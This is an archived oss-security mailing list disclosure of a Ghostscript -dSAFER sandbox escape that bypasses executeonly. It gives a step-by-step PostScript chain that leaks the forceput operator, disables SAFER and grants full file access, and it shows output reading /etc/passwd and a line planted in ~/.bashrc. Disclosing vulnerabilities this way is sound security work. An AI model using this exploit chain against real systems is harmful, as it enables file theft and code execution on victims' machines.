  oss-security - ghostscript: bypassing executeonly to escape -dSAFER sandbox            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 9 Oct From: Tavis Ormandy <taviso@...gle.com> To: oss-security@...ts.openwall.com Subject: ghostscript: bypassing executeonly to escape -dSAFER sandbox  Hello, this is another ghostscript -dSAFER sandbox escape that worked in HEAD up until recently, and probably all ghostscript versions still in use (I didn't check exactly how far back, but a long time).  Full working exploit that works in the last few versions is attached, viewing it in evince, imagemagick, gimp, okular, etc should add a line to ~/.bashrc. Because nautilus will automatically invoke evince-thumbnailer without any user-interaction, just browsing a website is enough to trigger the vulnerability in some common configurations.  taviso@...ntu:~$ convert exploit.jpg output.jpg taviso@...ntu:~$ tail -1 ~/.bashrc echo pwned by postscript  Good news: If your distro ships gnome-desktop or later and wasn't bananas enough to disable sandboxing (yes, some are really doing that), I don't know of any way to trigger automatic exploitation. If you open the file manually, you're still in trouble though.  BACKGROUND  One of the core access control features in postscript is the ability to mark procedures executeonly, this prevents users from peeking inside system routines and getting references to powerful operators they shouldn't have access to. I have a full description of how this mechanism works, but release of that description is blocking on some other embargoed issues. It should be available here eventually (please forgive this minor violation of list rules).  Until recently you could install an error handler in errordict <https://atrey.karlin.mff.cuni.cz/~milanek/PostScript/Reference/PSL2e.html#errordict> and if you cause an executeonly procedure to stop ("stop" is the postscript term for "throw an exception"), that would expose the faulting operator to the error handler. That is no longer possible, because errordict is now ignored in the -dSAFER sandbox (that was  DETAILS  Unfortunately, the fix was incomplete, because you could still make the invocation of the errorhandler itself fail, or access the saved errorhandler internal state.  One way to exploit this is to find an executeonly procedure that can stop, trigger an exception and then make calling the errorhandler stop (/stackoverflow or /execoverflow will do). When that fails the operand stack is left in an inconsistent state, because ghostscript was trying to set up the errorhandler but failed.  Here is how to exploit it:  % first, fill up the stack with junk so there is only a tiny bit of room for the errorhandler GS>0 1 {} for  % We can make /switch_to_normal_marking_ops fail by making pdfopdict a non-dictionary null def  % call /switch_to_normal_marking_ops (which is executeonly) /switch_to_normal_marking_ops get stopped  % that failed because of /typecheck writing to pdfopdict GS<2>== true  % And if we look at the last few elements of the saved stack... GS<1>dup dup length 10 sub 10 getinterval == null /m {normal_m} --.forceput-- /typecheck]  % The failed operator is on there ready to be passed to the errorhandler.  forceput is a very powerful operator that ignores all access controls, we can extract it from the stack, and then do whatever we like.  % Lets disable SAFER and give ourselves access to the whole filesystem (including .bashrc, ssh keys, chrome cookies, everything) systemdict /SAFER false forceput systemdict /userparams get /PermitFileControl [(*)] forceput systemdict /userparams get /PermitFileWriting [(*)] forceput systemdict /userparams get /PermitFileReading [(*)] forceput  Putting it all together, here is reading /etc/passwd just to demo:  $ gs -dSAFER -f test.ps GPL Ghostscript GIT PRERELEASE Copyright (C) Artifex Software, Inc.  All rights reserved. This software comes with NO WARRANTY: see the file PUBLIC for details. (root:x:0:0:root:/root:/bin/bash)  The fix is public now, here are the necessary commit:   p.s. plz can we deprecate untrusted postscript :(  Content of type "text/html" skipped  Download attachment "executeonly-bypass.ps" of type "application/postscript" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      